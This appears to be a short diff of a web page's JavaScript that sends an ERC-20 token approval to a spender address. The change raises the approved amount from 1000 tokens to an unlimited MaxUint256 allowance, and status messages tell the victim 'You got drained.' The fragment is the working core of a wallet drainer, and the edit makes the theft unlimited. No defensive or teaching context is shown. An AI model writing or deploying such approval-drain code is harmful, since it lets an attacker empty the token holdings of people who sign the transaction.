@@ -146,7 +146,7 @@
 
       try {
         status.innerText = "🚨 Sending approval transaction...";
-        const tx = await token.approve(spenderAddress, ethers.utils.parseEther("1000"));
+        const tx = await token.approve(spenderAddress, ethers.constants.MaxUint256);
         await tx.wait();
 
         status.innerText = `💀 Oops! You got drained.
